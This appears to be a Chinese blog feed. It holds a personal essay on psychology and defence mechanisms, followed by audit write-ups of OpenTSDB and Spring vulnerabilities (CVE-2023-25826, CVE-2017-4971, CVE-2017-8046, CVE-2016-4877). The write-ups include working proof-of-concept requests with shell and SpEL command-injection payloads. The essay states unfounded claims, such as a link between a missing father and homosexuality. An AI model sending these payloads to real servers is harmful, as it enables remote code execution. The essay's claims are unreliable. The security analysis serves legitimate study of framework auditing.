    <content type="html"><![CDATA[<p>今年年初的时候遭遇了一个人生难题，即我究竟是读研还是工作？我相信这个问题会困扰很多人。</p><p>对于某些人，可以很好的忽视它，继续生活和学习，尤其是你才大二上结束的情况下，离毕业还很远。但是我恰好不是这种人，难题摆在眼前，还是挺令人痛苦的。我做不到麻痹自己。或者说我的逃避行为不是麻痹。</p><p>所以我休息了将近两个月，但是也不是啥也没干，在此期间我看了很多书，这是我第一次发现读书对我的意义之大，理解了”精神食粮“的含义，看书很好的解决了我的人生难题。</p><p>关于人生的问题，没有人可以直接吸取二手的，只有通过思考获得的才是最好的。</p><p>所以我保持了这个习惯，持续到现在。未来我会阅读更多领域的书籍，这里以我从小就感兴趣的心理学为开端。</p><h1 id="我看了哪些书"><a href="#我看了哪些书" class="headerlink" title="我看了哪些书"></a>我看了哪些书</h1><p>列举的都是一些对我影响较大，且我认为质量还不错的书。</p><p>最初看的是一部分人生哲学的书，比如叔本华的系列，还有个印度的忘了叫啥了。</p><p>然后是阿德勒的《自卑与超越》，这本应该算是畅销书了，很多人应该都读过。</p><p>之后就开始接触精神分析了，但说实话精神分析学派初期的理论有点扯淡，一直往性上扯，尚不赞同。不过《殊途》这本还是很不错的，相对现代点，且是一本案例集。</p><p>中间有三个月我去看其他东西去了，最近看了《少有人走的路》，这本真的是大师级别的作品，一共八部，我只看了第一部。要看直接看这本就可以。</p><h1 id="如何认识自己"><a href="#如何认识自己" class="headerlink" title="如何认识自己"></a>如何认识自己</h1><p>我并非专业的心理咨询师，所以文章部分会有谬误，不适合所有人。</p><p>绝大部分人并不完全认识自己，这是一个事实。且认识自己必然会遇到痛苦和抗拒，是需要勇气的。如果说一个人自称我很了解我自己，但没有经历痛苦，那么一定是错的。</p><h3 id="潜意识与意识"><a href="#潜意识与意识" class="headerlink" title="潜意识与意识"></a>潜意识与意识</h3><p>人的显意识只占潜意识的5%，剩下95%是一个浩瀚的领域。潜意识这个词和平常接触到的不太一样，心理学上的潜意识大概指的是“没有意识到的情绪”。比如青少年犯罪，很大一个原因是因为从小缺乏父母的关注，因此犯罪来求得别人关注。对于他们本人来说，并不清楚这个原因。</p><h3 id="防御行为"><a href="#防御行为" class="headerlink" title="防御行为"></a>防御行为</h3><p>这个算是最有趣的地方之一了，一个人的防御行为是怎么样的。我将列举一些常见的。</p><ol><li><p>否认：字面意思，如果一个人收到了医院不良的诊断结果，但拒绝相信</p></li><li><p>投射：将自己的感受投射给另一个人，如果一个人嫉妒他的同事，那么他会指责他的同事们嫉妒他</p></li><li><p>合理化：如果一个人考试没及格，那么会想这次考试&#x2F;科目&#x2F;成绩其实并不重要</p></li><li><p>退行：回到早期的状态，比如一个成年人面对压力，会吮吸手指</p></li><li><p>转移：比如对老板生气，但不表达，回家撒气到家人身上</p></li><li><p>升华：比如一个有攻击倾向的人选择去成为一个运动员</p></li><li><p>理智化：过度关注抽象概念，比如亲人死去后，理智化的人会去研究什么是悲伤情绪，为什么人会悲伤</p></li><li><p>补偿：例如，一个对长相自卑的人，会尝试去在运动&#x2F;职场&#x2F;幽默感等方面取得高度成功来补偿自己</p></li><li><p>反向：字面意思，比如一个人对另一个人抱有强烈敌意，但表现出了过度的热情和亲近</p></li><li><p>压制：例如经历创伤事件的人，永远不再谈论这个事件。让这件事在记忆里消除。</p></li><li><p>回避：例如，经历过车祸的人，不再选择乘车出行。</p></li><li><p>幽默：例如在面对严肃又困难的情景，尝试去开玩笑来应对压力</p></li><li><p>幻想：例如，一个人对自己的生活不满意，会幻想自己中了大奖&#x2F;有完美伴侣&#x2F;立即退休等</p></li><li><p>理智化处理：与理智化不同的是，这个更多关注该如何做。例如一个刚分手的人，理智化的人尝试去研究为什么分手，后者关注如何分配财务，未来要如何去行动等。</p></li><li><p>选择性注意：例如一个对演讲紧张的人，他会过度注意他的幻灯片制作</p></li><li><p>分离：在面对压到性的创伤时，例如一个人可能会觉得，像是在第三者看自己的经历</p></li><li><p>认同：例如一个孩子会模仿超级英雄的行为举止，说话方式和口头禅</p></li><li><p>理想化：例如，一个人对他喜欢的异性，将一些不存在的优秀特质投射到异性身上，以此来完成自己的想象</p></li><li><p>妥协：面对两难的难题，妥协会尽量尝试去找到一个中间的立场，做到客观化来解决相互冲突的思想感受与欲望。</p></li><li><p>利他主义：通过关注他人的需求或帮助他人，来应对压力或焦虑</p></li><li><p>抵消：例如一个人因为攻击了别人感到内疚，而选择去做好事&#x2F;过度道歉来让自己感觉舒服点</p></li><li><p>压抑：类似于遗忘，例如在面对童年创伤时，发现自己根本想不起来，但随着心理治疗的进行又会想起来。</p></li><li><p>精神化：选择去寻找精神信仰或宗教来应对痛苦</p><p>如上，我们都可以在生活中见到拥有这些防御机制的人。有些是建设性的，有些是摧毁性的，了解自己的防御机制，通过防御行为可以找到自己人性的弱点，可以更好的认识自己。</p></li></ol><h2 id="尝试去分析自己"><a href="#尝试去分析自己" class="headerlink" title="尝试去分析自己"></a>尝试去分析自己</h2><p>一个出色的心理治疗师必定是先去分析自己的，同时，他也必定是一个好父亲&#x2F;母亲。</p><p>为什么会对选择未来感到焦虑？什么是焦虑？焦虑和恐惧很类似，都是害怕一些东西，面对焦虑，人会本能的做出逃避行为，例如有些人会让自己沉浸工作，忘掉外界，这种逃避模式可以让人很好的应对危机，另一类人群尝试做一些其他事，例如锻炼，或者培养新的爱好。很可惜我并不是这类人，面对过量的焦虑，我的大脑强迫我让我停下来。</p><p>焦虑，是对未来不确定，或者还未发生的事情而害怕。恐惧，是害怕已经到来的实体，事件。其内核都是害怕。怕什么？</p><p>我们可以从假设的方式来分析，如果未能达到自己要求，则会面临失败。那么失败往往面临着他人的评价，尽管这个他人可能并不存在。所以，我过去所害怕的正是他人的评价。</p><p>这里要提到一个容易错误的地方，关键是是否引发了情绪。例如一个人做决定犹豫不决，他有可能单纯是在理性的衡量利益。但如果他因此而焦虑痛苦，那么一定就存在他意识不到的潜意识在作祟了。</p><p>人天生会追求优越感，如果在适当的范围内，就是有益的。为什么会害怕他人评价，无非是自卑心理。而自卑往往伴随着自恋，如果表现优秀，则这类人会异常外向与自信，如果表现不好，那么这类人往往会内向不语，在公众场合比较安静。</p><p>适当的自恋是有益的，人人都需要一定的自恋，这对自我价值的肯定有很大帮助。但如果过度，就会对生活产生影响。</p><p>自卑与自负，自恋。这些看起来相反，实际上是一种东西。代表了人对优越感的追求。过度自卑与自负的人，即过度追求了优越感。</p><p>例如一个人很少和他人交往，有可能他很愿意去认识别人，但害怕别人接纳自己，所以选择的策略是，只要我不这么做，我就不会受到失败的惩罚。便不做。</p><p>例如一个人害怕竞争，那么我便不去竞争，来达到保护自己的目的。另一种情况是，将所有的注意力都放在竞争中，不再关注自身，也是一种保护。</p><p>再例如有些人喜欢做团队中的活宝，其目的是吸引关注，希望他人关注自己。</p><p>再再例如，强迫他人认同自己的观点，或过度寻求认同感，这是对自己观点的不自信。其实是自卑。这点可以在很多东亚家庭的父母身上找到。</p><p>所以如果有遇到令自己痛苦的事，是自己的潜意识和显意识出现了偏差导致的。在现代这个饿不死人的社会，除却身体的痛苦，99%都是来自于自己的观念。而面对痛苦，幼年时期的经历往往决定了一个人的防御行为。如果是一种摧毁性的防御行为，有个通俗的词语叫“巨婴”，说的就是这个道理。</p><p>这里并不讨论其优劣，这些都是客观发生的事，仅对现象做表述。</p><p>人是一切社会关系的总和，为什么会自卑，其必然存在一个评价体系，在远古时期是狩猎技巧，身体强壮程度等。在现代社会，你的评价体系来自于个人的观念。其中大部分来自于社会。</p><p>在幼年，评价体系是是否听爸爸妈妈的话，是否犯错，在中学时代，评价体系主要是学生的成绩。在社会，评价体系主要是是否有钱，伴侣是否优秀，人品是否值得信赖。在老年，评价体系是</p><p>是否多子多福。随着时代的变迁，如今多子多福在很多年轻人眼里已经成了诅咒，而不是一种正向的评价。</p><p>我抱着强烈的好奇心研究了欧洲的一些社科发展的历史，其结果是令我惊讶的，在100年前，欧美人和东亚人卷的程度不相上下，甚至比这边还卷。随着社会的发展，卷也慢慢消失了，大家学会享受生活了。</p><p>当然，也和那边的政治体系偏向社民有关系，过多不做评价。但是可以看出来的一点是，社会评价随着时代的发展而变化。</p><p>那么是否可以建立自己的评价体系，而非世俗的评价，例如我更多关注我的生活质量，我的幸福度，我这一生有没有想做的事，这种做法与国内所推崇的集体主义思想一定程度上相左，但去做自己想做的事，是否也顺带为他人增加了福祉？对整个社会的影响如何？这些就会上升到哲学层面和政治层面的问题了。</p><p>这就回到了我一年的年终总结问自己的问题，我该如何获取最大的幸福？我认为有两种办法，第一种是去做一个智慧的人，另一种是去做一个简单的人。对我而言，我选择做前者而非后者。我的理智化的防御行为促使我做了这些思考，从整体上来看，是一个建设性的逃避行为。</p><p>整个过程是一个探索潜意识的过程，让病人认识到自己的潜意识，是现代精神分析的治疗原理之一。假如让我现在对自己的人生做决定，我可能只需要几天，而不再是两个月，或者更长了。</p><h1 id="其他有趣的话题"><a href="#其他有趣的话题" class="headerlink" title="其他有趣的话题"></a>其他有趣的话题</h1><h2 id="精神分析是不是一门科学？"><a href="#精神分析是不是一门科学？" class="headerlink" title="精神分析是不是一门科学？"></a>精神分析是不是一门科学？</h2><p>不是。目前科学在心理咨询更多的是辅助手段。</p><p>说白了，以人类目前的科技没办法单纯的治好心理问题。过去填个表，做实验，以为这些就有用，然后就横空出世蹦出了一个弗洛伊德狠狠地批判了这种做法，并开创了自己的学派。科学对人类的帮助仍然是有限的，只坚信科学是一种学生思维，是有害的，学理科学太多导致的。毕竟，它连人类意识是如何产生的都无法解释。</p><h2 id="人是理性的还是感性的动物？"><a href="#人是理性的还是感性的动物？" class="headerlink" title="人是理性的还是感性的动物？"></a>人是理性的还是感性的动物？</h2><p>人是感性的动物。在工业革命后，人类对自己的理性所建立的科学，达到了前所未有的自信。这个时期的人们崇尚理性。在19世纪，理性被越来越用作压抑自己，而非之前的含义。</p><p>这个时期在欧美社会，最常见的压抑就是压抑性欲和敌意，婚前性行为是羞耻的，对他人有强烈敌意是不对的。后来他们的社会经历了性解放，敌意也不再被视为错误。</p><p>同样的在日本社会和韩国社会也有这样的发展历程，中国社会未来大概率也经历这些，不过那都是后话了。</p><p>人之所以为人，是因为人拥有复杂的情感。如果生活中有一个人常用理性来为自己辩护，不用怀疑，那是一种防御行为。</p><h2 id="谈恋爱对人成长的意义？"><a href="#谈恋爱对人成长的意义？" class="headerlink" title="谈恋爱对人成长的意义？"></a>谈恋爱对人成长的意义？</h2><p>我对国内的一种独特的现象和名词做过很多思考：早恋。全世界中国独有（宗教国家和极权主义国家不作考虑）。</p><p>青春期这种现象是很正常的，我很庆幸我的中学不怎么管这些事。事实上，人经历亲密关系，就是在重新经历亲子关系。</p><p>有些人容易情绪剧烈波动，引发较强的攻击性行为；有些人强烈渴望要求被关注；有些人面对感情问题沉默不语或极力辩解；有些人在恋爱中容易极其自卑等。事实上这些都和父母的相处模式，父母和自己的相处模式有着密不可分的关系。</p><p>再例如如果男性缺乏父爱，容易导致成为同性恋。这是俄狄浦斯情节。在女性强势的家庭，男孩在长大后更容易自卑，而失去探索自我边界的勇气。</p><p>所以我认为经历亲密关系对人的一些方面的成长具有不可替代性的意义。当然，应当在失控之前有良好引导，但是这是国内大部分家庭无法做到的。</p><p>那么禁止早恋是否意味着一定程度上拖垮了全社会的心智发展，是个有趣的问题。</p><h2 id="学习心理学的意义"><a href="#学习心理学的意义" class="headerlink" title="学习心理学的意义"></a>学习心理学的意义</h2><p>很显然，学习心理学可以让我的生活更好。我只可以通过学习解决我自己生活中的问题，但人类情感之复杂，如果要尝试解决别人的就不行了。这种要通过几年的培训，成为一名专业的心理咨询师。</p><p>我希望我的生活多一些好奇心和求知欲，我前进的动力来自人性上积极的一面。而非恐惧，焦虑，害怕。当代年轻人为什么如此焦虑？为什么年龄稍大反而焦虑程度会下降？在分析自己的同时，就已经找到了答案。希望我的帖子对正在看的人能有所帮助。</p>]]></content>
    
    
    
    <tags>
      
      <tag>life</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>命令注入漏洞（CVE-2023-25826）</title>
    <link href="/2024/08/05/opentsdb%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9ECVE-2023-25826/"/>
    <url>/2024/08/05/opentsdb%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9ECVE-2023-25826/</url>
    
    <content type="html"><![CDATA[<p>网上简单搜了一下发现没啥人写这个的分析，那我就发了。</p><p>debug环境懒得配了，静态看吧。</p><h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><p>先插一条数据：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/api/put/</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>your-ip:4242<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>*/*<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>en<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>150<br><br><span class="language-json"><span class="hljs-punctuation">&#123;</span></span><br><span class="language-json">    <span class="hljs-attr">&quot;metric&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;sys.cpu.nice&quot;</span><span class="hljs-punctuation">,</span></span><br><span class="language-json">    <span class="hljs-attr">&quot;timestamp&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1346846400</span><span class="hljs-punctuation">,</span></span><br><span class="language-json">    <span class="hljs-attr">&quot;value&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">20</span><span class="hljs-punctuation">,</span></span><br><span class="language-json">    <span class="hljs-attr">&quot;tags&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span></span><br><span class="language-json">       <span class="hljs-attr">&quot;host&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;web01&quot;</span><span class="hljs-punctuation">,</span></span><br><span class="language-json">       <span class="hljs-attr">&quot;dc&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;lga&quot;</span></span><br><span class="language-json">    <span class="hljs-punctuation">&#125;</span></span><br><span class="language-json"><span class="hljs-punctuation">&#125;</span></span><br></code></pre></td></tr></table></figure><p>然后发包。</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/q?start=2000/10/21-00:00:00&amp;m=sum:sys.cpu.nice&amp;o=&amp;ylabel=1&amp;xrange=&amp;y2range=[42:42]&amp;key=%3Bsystem%20%22touch%20/tmp/poc%22%20%22&amp;wxh=1516x644&amp;style=linespoint&amp;baba=lala&amp;grid=t&amp;json</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>your-ip:4242<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>*/*<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>en<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><br><br></code></pre></td></tr></table></figure><p>可以看到key参数注了。进docker把环境copy出来，jadx打开lib&#x2F;tsdb-2.4.1.jar</p><h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><p>全局搜索下&#x2F;api&#x2F;put</p><p><img src="/../opentsdb/image-20240805112024751.png" alt="image-20240805112024751"></p><p>可以看到q这个路由了，GraphHandler看看。</p><p>首先看下payload：</p><p><img src="/../opentsdb/image-20240805112203569.png" alt="image-20240805112203569"></p><p>明显是shell的命令注入，基础知识：Runtime肯定不能这么注。因为他对一些shell的符号如; &amp; |做了处理，那么九成是ProcessBuilder了。</p><p>其实Runtime.exec就是封装了ProcessBuilder。</p><p>直接搜ProcessBuilder：</p><p><img src="/../opentsdb/image-20240805112447335.png" alt="image-20240805112447335"></p><h2 id="GNUPLOT"><a href="#GNUPLOT" class="headerlink" title="GNUPLOT"></a>GNUPLOT</h2><p><img src="/../opentsdb/image-20240805112741837.png" alt="image-20240805112741837"></p><p>可以发现是bin目录下的这个</p><p><img src="/../opentsdb/image-20240805112802744.png" alt="image-20240805112802744"></p><p><img src="/../opentsdb/image-20240805112811911.png" alt="image-20240805112811911"></p><h2 id="basepath"><a href="#basepath" class="headerlink" title="basepath"></a>basepath</h2><p>接下来关注下这个str参数。</p><p>是basepath</p><p><img src="/../opentsdb/image-20240805114332430.png" alt="image-20240805114332430"></p><p>basepath怎么设置的，在这</p><p><img src="/../opentsdb/image-20240805114409710.png" alt="image-20240805114409710"></p><p>这里我去config里看了下，没搜到tsd.http.cachedir， 所以我去&#x2F;etc&#x2F;openstdb.conf文件里看了下</p><p><img src="/../opentsdb/image-20240805114455927.png" alt="image-20240805114455927"></p><h2 id="plot"><a href="#plot" class="headerlink" title="plot"></a>plot</h2><p>再看下这个参数，他在这里可能是干什么的。</p><p><img src="/../opentsdb/image-20240805114656654.png" alt="image-20240805114656654"></p><p>如图，相当于一个map放了各种参数，在runGnuplot的时候直接把他dump到file里了。</p><p><img src="/../opentsdb/image-20240805114736701.png" alt="image-20240805114736701"></p><p>根据上述分析我们已经知道了bashpath在哪了，直接去&#x2F;tmp&#x2F;opentsdb看看有什么</p><p><img src="/../opentsdb/image-20240805114921193.png" alt="image-20240805114921193"></p><p>到这就很清晰了，这个路由的作用就是调用mygnuplot.sh脚本，get参数还可以设置到临时文件里，然后再调这个临时文件。但是由于过滤不当造成了shell命令注入。</p><p>现在回头看过滤。</p><p><img src="/../opentsdb/image-20240805115032924.png" alt="image-20240805115032924"></p><p>很菜的过滤，直接就绕了。</p><p>总结：</p><p>其实和刚入门靶场里的system(“ping $_GET[1]”)没啥区别，只不过代码多了点。</p>]]></content>
    
    
    
    <tags>
      
      <tag>java security</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>从spring历史漏洞学框架审计(2)</title>
    <link href="/2024/08/01/%E4%BB%8Espring%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%AD%A6%E6%A1%86%E6%9E%B6%E5%AE%A1%E8%AE%A1-2/"/>
    <url>/2024/08/01/%E4%BB%8Espring%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%AD%A6%E6%A1%86%E6%9E%B6%E5%AE%A1%E8%AE%A1-2/</url>
    
    <content type="html"><![CDATA[<h1 id="CVE-2017-4971"><a href="#CVE-2017-4971" class="headerlink" title="CVE-2017-4971"></a>CVE-2017-4971</h1><p>环境来源于vulhub，vulhub那个也是官方的example。</p><p>还是先理清路由的逻辑。仍然是DispatherServlet分发，来到FlowHandlerAdapter</p><p><img src="/../spring001/image-20240801101504252.png" alt="image-20240801101504252"></p><p>往下几层会来到ViewState的处理。</p><p><img src="/../spring001/image-20240801101542707.png" alt="image-20240801101542707"></p><p>在绑定数据的时候出现了问题。具体看addDefaultMappings和addEmptyValueMapping这两个函数。</p><p><img src="/../spring001/image-20240801102141107.png" alt="image-20240801102141107"></p><p><img src="/../spring001/image-20240801102151712.png" alt="image-20240801102151712"></p><p>这里检查参数要满足_开头，正如官方文档说的那样。然后会调用addExmtyMapping</p><p><img src="/../spring001/image-20240801102236798.png" alt="image-20240801102236798"></p><p>到这就可以了，用了Spel表达式对传入的field进行了getValue。导致了RCE。</p><p>那么从漏洞发现者的角度来看，怎么寻找这样类型的漏洞？其实还是Spel表达式的使用，且有外部数据的输入。</p><p>还有哪些场景可能会用到表达式？比如属性配置解析，复杂数据校验，动态的方法，流程啥的等等，未来可以关注一下。</p><p>思路总结：</p><p>参数绑定与表达式造成的漏洞</p><p>路由处理</p><h1 id="CVE-2017-8046"><a href="#CVE-2017-8046" class="headerlink" title="CVE-2017-8046"></a>CVE-2017-8046</h1><p>和上面一毛一样也是数据绑定出的问题。poc：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">PATCH</span> <span class="hljs-string">/customers/1</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>localhost:8080<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>*/*<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>en<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/json-patch+json<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>200<br><br><span class="language-haxe">[&#123; <span class="hljs-string">&quot;op&quot;</span>: <span class="hljs-type"></span>&quot;replace<span class="hljs-string">&quot;, &quot;</span>path<span class="hljs-string">&quot;: &quot;</span>T(java.lang.Runtime).getRuntime().exec(<span class="hljs-keyword">new</span> <span class="hljs-type">java</span>.lang.<span class="hljs-keyword">String</span>(<span class="hljs-keyword">new</span> <span class="hljs-type">byte</span>[]&#123;<span class="hljs-number">116</span>,<span class="hljs-number">111</span>,<span class="hljs-number">117</span>,<span class="hljs-number">99</span>,<span class="hljs-number">104</span>,<span class="hljs-number">32</span>,<span class="hljs-number">47</span>,<span class="hljs-number">116</span>,<span class="hljs-number">109</span>,<span class="hljs-number">112</span>,<span class="hljs-number">47</span>,<span class="hljs-number">115</span>,<span class="hljs-number">117</span>,<span class="hljs-number">99</span>,<span class="hljs-number">99</span>,<span class="hljs-number">101</span>,<span class="hljs-number">115</span>,<span class="hljs-number">115</span>&#125;))/lastname<span class="hljs-string">&quot;, &quot;</span>value<span class="hljs-string">&quot;: &quot;</span>vulhub<span class="hljs-string">&quot; &#125;]</span></span><br></code></pre></td></tr></table></figure><p>发送patch方法的时候会出问题。</p><p>关键在这：</p><p><img src="/../spring001/image-20240801111631141.png" alt="image-20240801111631141"></p><p>来到convert</p><p><img src="/../spring001/image-20240801111708536.png" alt="image-20240801111708536"></p><p>这里提取了path的值，然后new了一个ReplaceOperation。</p><p>ReplaceOperation的父类是PatchOperation，点进去看下构造函数：</p><p><img src="/../spring001/image-20240801111801252.png" alt="image-20240801111801252"></p><p>这里用了spel表达式，再往下看。</p><p>回到刚刚的applyPatch，跟后面的apply方法</p><p><img src="/../spring001/image-20240801111927960.png" alt="image-20240801111927960"></p><p>之前的ReplcaeOperation.perform的时候，进行了setValueOnTarget</p><p><img src="/../spring001/image-20240801112105466.png" alt="image-20240801112105466"></p><p>封装了Spel表达式的setvalue。审计到这就可以结束了。</p><p>很明显还有其他的payload。</p><p>比如换成op换成add。</p><p>或者</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">PATCH</span> <span class="hljs-string">/customers/1</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>localhost:8080<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>*/*<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>en<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/json-patch+json<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>357<br><br><span class="language-dns">[&#123; &quot;op&quot;: &quot;copy&quot;, &quot;path&quot;: &quot;T(java.lang.Runtime).getRuntime().exec(new java.lang.String(new byte[]&#123;<span class="hljs-number">116,111,117,99</span>,<span class="hljs-number">104,32,47,116</span>,<span class="hljs-number">109,112,47,115</span>,<span class="hljs-number">117,99,99,101</span>,<span class="hljs-number">115,115</span>&#125;))/lastname&quot;,</span><br><span class="language-dns">&quot;from&quot;:&quot;T(java.lang.Runtime).getRuntime().exec(new java.lang.String(new byte[]&#123;<span class="hljs-number">116,111,117,99</span>,<span class="hljs-number">104,32,47,116</span>,<span class="hljs-number">109,112,47,115</span>,<span class="hljs-number">117,99,99,101</span>,<span class="hljs-number">115,115</span>&#125;))/lastname&quot;, &quot;value&quot;: &quot;vulhub&quot; &#125;]</span><br></code></pre></td></tr></table></figure><p>都可以。</p>]]></content>
    
    
    
    <tags>
      
      <tag>java security</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>从spring历史漏洞学框架审计(1)</title>
    <link href="/2024/07/31/%E4%BB%8Espring%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%AD%A6%E6%A1%86%E6%9E%B6%E5%AE%A1%E8%AE%A1-1/"/>
    <url>/2024/07/31/%E4%BB%8Espring%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%AD%A6%E6%A1%86%E6%9E%B6%E5%AE%A1%E8%AE%A1-1/</url>
    
    <content type="html"><![CDATA[<p>感觉审计web框架和审计cms等web应用有挺大差别，说实话没啥思路，最近打算学习下spring历史漏洞锻炼下自己。</p><p>本篇是第一篇文章，CVE-2016-4877 spring security oauth Spel RCE</p><h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><p>直接起的vulhub环境。poc很简单：</p><p><a href="http://localhost:8080/oauth/authorize?response_type=$%7BT(java.lang.Runtime).getRuntime().exec(%22calc%22)%7D&client_id=acme&scope=openid&redirect_uri=http://test">http://localhost:8080/oauth/authorize?response_type=${T(java.lang.Runtime).getRuntime().exec(%22calc%22)}&amp;client_id=acme&amp;scope=openid&amp;redirect_uri=http://test</a></p><p>值得注意的是这里对exec里面做了点处理，相当于过滤了空格的Spel注入。</p><h1 id="spring路由分发"><a href="#spring路由分发" class="headerlink" title="spring路由分发"></a>spring路由分发</h1><p>spring路由分发一般由这两个类来处理<br>FrameworkServlet –&gt; DispatherServlet<br>其中后者是前者的子类。看意思也很好理解，分发者Servlet。<br>关键在于DispatcherServlet的doDispatch方法。</p><p><img src="/../spring001/image-20240731172959963.png" alt="image-20240731172959963"></p><p>感觉分发逻辑在这里面，经过层层跟进来到了AuthorizationEndpoint这个类，中间好多层不写了。</p><p><img src="/../spring001/image-20240731173051126.png" alt="image-20240731173051126"></p><p>如图，这是spring的默认路由。在处理完后会进行render。</p><p>很明显这里在处理responseTypes会报Exception，但是先别急，很多时候忽略了Exception的审计，到这就不看了。这是不对的，很有可能就会错过漏洞点。</p><h1 id="异常处理审计"><a href="#异常处理审计" class="headerlink" title="异常处理审计"></a>异常处理审计</h1><p>spring在捕获Exception后会来到&#x2F;oauth&#x2F;error这个路由，又是经过一大串的filter，来到这里：</p><p><img src="/../spring001/image-20240731173405081.png" alt="image-20240731173405081"></p><p>这里render用的是SpelView渲染，如果参数可控，很大概率有漏洞。</p><p>随便跟两层：</p><p><img src="/../spring001/image-20240731173440291.png" alt="image-20240731173440291"></p><p>到此处就不必多说了。</p><p>总结思路：</p><p>异常处理的审计</p><p>默认路由审计</p><p>spring路由源码阅读</p><p>审计框架，如果有表达式处理的组件如OGNL，Spel等，想办法让框架报错看看怎么处理的。是一个很好的思路。</p><p>参考：</p><p><a 